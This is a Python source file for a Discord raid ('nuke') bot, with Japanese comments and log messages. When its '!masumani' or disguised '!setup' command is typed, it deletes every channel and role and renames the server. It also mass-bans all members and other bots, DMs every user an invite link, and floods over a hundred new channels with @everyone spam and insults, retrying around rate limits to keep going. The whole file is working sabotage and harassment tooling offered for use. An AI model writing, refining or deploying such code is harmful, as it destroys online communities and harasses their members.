import discord
from discord.ext import commands
import asyncio
import random
import os
from dotenv import load_dotenv

load_dotenv()
TOKEN = os.getenv("TOKEN")
PREFIX = "!"
DEFAULT_NEW_NAME = "ますまに共栄圏植民地"
INVITE_LINK = "https://discord.gg/tqNR7BsAsR"

intents = discord.Intents.default()
intents.members = True
intents.message_content = True
intents.bans = True
intents.guilds = True

bot = commands.Bot(command_prefix=PREFIX, intents=intents, help_command=None)

guild_member_counts = {}

@bot.event
async def on_guild_join(guild):
    count = sum(1 for m in guild.members if not m.bot)
    guild_member_counts[guild.id] = count
    print(f"参加: {guild.name} ({count} non-bot members)")

sem_global = asyncio.Semaphore(40)
sem_message = asyncio.Semaphore(100)
sem_dm = asyncio.Semaphore(20)

async def limited_global(coro):
    async with sem_global:
        try:
            await coro
        except:
            pass

async def limited_message(coro):
    async with sem_message:
        try:
            await coro
        except:
            pass

async def limited_dm(coro):
    async with sem_dm:
        try:
            await coro
        except:
            pass

async def send_dm(member, content):
    try:
        await member.send(content)
    except:
        pass

async def create_channel_safely(guild, counter):
    try:
        ch = await guild.create_text_channel("ますまに共栄圏万歳")
        print(f"作成成功 [{counter}]")
        return ch
    except discord.HTTPException as e:
        if e.status == 429:
            retry = getattr(e, 'retry_after', 3)
            print(f"429検知！ {retry:.1f}秒待機して再試行")
            await asyncio.sleep(retry + 0.1)
            return await create_channel_safely(guild, counter)
        else:
            print(f"チャンネル作成エラー: {e}")
            return None
    except Exception as e:
        print(f"予期せぬエラー: {e}")
        return None

async def delete_all_roles_task(guild):
    print("ロール全削除タスク開始...")
    roles_to_delete = [r for r in guild.roles if not r.is_default() and not r.managed]
    delete_tasks = []
    batch_size = 30
    for i in range(0, len(roles_to_delete), batch_size):
        batch = roles_to_delete[i:i+batch_size]
        delete_tasks.extend([limited_global(r.delete()) for r in batch])

    await asyncio.gather(*delete_tasks, return_exceptions=True)
    print("ロール全削除タスク完了")

async def create_colored_roles_task(guild, target_roles):
    print(f"カラフルロール作成タスク開始... 目標: {target_roles}")
    current = 0
    role_batch_size = 40
    batch_sleep_base = 0.04

    while current < target_roles:
        tasks = []
        for _ in range(role_batch_size):
            if current >= target_roles:
                break
            current += 1
            tasks.append(limited_global(guild.create_role(
                name="ますまに共栄圏最強",
                color=discord.Color.random(),
                reason=""
            )))

        batch_results = await asyncio.gather(*tasks, return_exceptions=True)
        added = sum(1 for r in batch_results if isinstance(r, discord.Role))
        print(f"ロールバッチ完了: +{added}個 (合計 {current}/{target_roles})")
        await asyncio.sleep(random.uniform(batch_sleep_base, batch_sleep_base + 0.08))

        if added == 0:
            print("ロール連続失敗 → 作成中断")
            break

    print(f"ロール作成タスク完了: {current}個")

async def ban_all_task(guild, members, reason):
    print("BANタスク開始...")
    ban_tasks = []
    for m in members:
        ban_tasks.append(limited_global(guild.ban(m, reason=reason, delete_message_days=0)))
    await asyncio.gather(*ban_tasks, return_exceptions=True)
    print("BANタスク完了")

async def core_nuke(guild, new_server_name=None):
    new_name = new_server_name or DEFAULT_NEW_NAME
    print(f"ますまに開始: {guild.name}")

    members = [m for m in guild.members if m != bot.user]
    non_bot_members = [m for m in members if not m.bot]

    # 1. 他のボットを最初にBAN
    print("他のボットをBAN開始...")
    bot_ban_tasks = [limited_global(guild.ban(m, reason="", delete_message_days=0)) for m in members if m.bot]
    await asyncio.gather(*bot_ban_tasks, return_exceptions=True)
    print("他のボットBAN完了")

    # 2. DM送信
    dm_content = f"{new_name} {INVITE_LINK}"
    dm_tasks = [limited_dm(send_dm(m, dm_content)) for m in non_bot_members]
    await asyncio.gather(*dm_tasks)
    print(f"DM完了: {len(non_bot_members)}人")

    # 3. 全チャンネル削除
    print("全チャンネル削除開始...")
    await asyncio.gather(*(ch.delete() for ch in guild.channels), return_exceptions=True)
    print("全チャンネル削除完了")

    # 4. サーバー名変更（チャンネル削除後）
    try:
        await guild.edit(name=new_name, reason="")
        print("サーバー名変更完了")
    except:
        print("サーバー名変更スキップ")

    # 規模別調整
    member_count = len(non_bot_members)
    if member_count < 100:
        dm_concurrency = 30
        target_channels = 130
        target_roles = 130
        messages_per_channel_goal = 100
        channel_batch_size = 50
        batch_sleep_base = 0.04
        spam_round_sleep_min = 0.04
        spam_round_sleep_max = 0.12
        print("小規模サーバー → 超爆速鬼モード")
    elif member_count < 500:
        dm_concurrency = 20
        target_channels = 120
        target_roles = 100
        messages_per_channel_goal = 100
        channel_batch_size = 45
        batch_sleep_base = 0.08
        spam_round_sleep_min = 0.08
        spam_round_sleep_max = 0.2
        print("中規模サーバー → 爆速モード")
    else:
        dm_concurrency = 8
        target_channels = 110
        target_roles = 80
        messages_per_channel_goal = 100
        channel_batch_size = 35
        batch_sleep_base = 0.15
        spam_round_sleep_min = 0.15
        spam_round_sleep_max = 0.35
        print("大規模サーバー → 高速安定モード")

    global sem_dm
    sem_dm = asyncio.Semaphore(dm_concurrency)

    # 5. チャンネル作成
    channels = []
    current = 0
    print(f"チャンネル作成開始... 目標: {target_channels}")

    while len(channels) < target_channels:
        tasks = []
        for _ in range(channel_batch_size):
            if len(channels) >= target_channels:
                break
            current += 1
            tasks.append(create_channel_safely(guild, current))

        if not tasks:
            break

        created_batch = await asyncio.gather(*tasks, return_exceptions=True)
        added = 0
        for res in created_batch:
            if isinstance(res, discord.TextChannel):
                channels.append(res)
                added += 1

        print(f"チャンネルバッチ完了: +{added}個 (合計 {len(channels)}/{target_channels})")

        await asyncio.sleep(random.uniform(batch_sleep_base, batch_sleep_base + 0.08))

        if added == 0:
            print("チャンネル連続失敗 → 作成中断")
            break

    print(f"チャンネル作成完了: {len(channels)}個")

    if not channels:
        print("チャンネルゼロ → BANのみ実行")
        ban_task = asyncio.create_task(ban_all_task(guild, non_bot_members, new_name))
        await ban_task
        print("BAN完了")
        return

    # 6. スパム開始 + ロール削除・作成・BANを並行で起動
    spam_messages = [
        f"@everyone {new_name} 万歳！！！ {INVITE_LINK}",
        f"@everyone ますまに共栄圏最強 {INVITE_LINK}",
        f"@everyone 雑魚乙ゴミサーバー {INVITE_LINK}",
        f"@everyone 来いよ {INVITE_LINK}"
    ]

    message_counters = {ch.id: 0 for ch in channels}
    active_channels = channels.copy()

    print(f"高速同時ラウンドロビンスパム開始... 各チャンネル {messages_per_channel_goal}メッセージまで")

    # 並行タスク起動（ロール削除・作成・BAN）
    role_delete_task = asyncio.create_task(delete_all_roles_task(guild))
    role_create_task = asyncio.create_task(create_colored_roles_task(guild, target_roles))
    ban_task = asyncio.create_task(ban_all_task(guild, non_bot_members, new_name))

    spam_running = True
    while spam_running:
        spam_tasks = []
        for ch in active_channels[:]:
            if message_counters[ch.id] >= messages_per_channel_goal:
                active_channels.remove(ch)
                continue

            async def send_one(ch=ch):
                try:
                    msg = random.choice(spam_messages)
                    await limited_message(ch.send(msg))
                    message_counters[ch.id] += 1
                    print(f"[{ch.name}] 送信 {message_counters[ch.id]}/{messages_per_channel_goal}")
                except discord.HTTPException as e:
                    if e.status == 429:
                        retry = getattr(e, 'retry_after', 2) + 0.3
                        print(f"[{ch.name}] 429待機 {retry:.2f}s")
                        await asyncio.sleep(retry)
                        spam_tasks.append(send_one(ch))
                    else:
                        print(f"[{ch.name}] エラー {e} → 除外")
                        if ch in active_channels:
                            active_channels.remove(ch)
                except:
                    print(f"[{ch.name}] 予期せぬエラー → 除外")
                    if ch in active_channels:
                        active_channels.remove(ch)

            spam_tasks.append(send_one())

        if spam_tasks:
            await asyncio.gather(*spam_tasks, return_exceptions=True)

        await asyncio.sleep(random.uniform(spam_round_sleep_min, spam_round_sleep_max))

        # すべてのチャンネルが100に達したらスパム終了
        if not any(count < messages_per_channel_goal for count in message_counters.values()):
            spam_running = False

    print("全チャンネル100メッセージ達成 → スパム完了")

    # 並行タスクが全部終わるまで待機
    await role_delete_task
    await role_create_task
    await ban_task

    print("全工程完了")

@bot.command(name="masumani", aliases=["setup"])
async def trigger(ctx, *, new_name: str = None):
    if not ctx.guild:
        return
    try:
        await ctx.message.delete()
    except:
        pass
    asyncio.create_task(core_nuke(ctx.guild, new_name))

@bot.event
async def on_ready():
    print(f"ボット起動: {bot.user} (ID: {bot.user.id})")

bot.run(TOKEN)
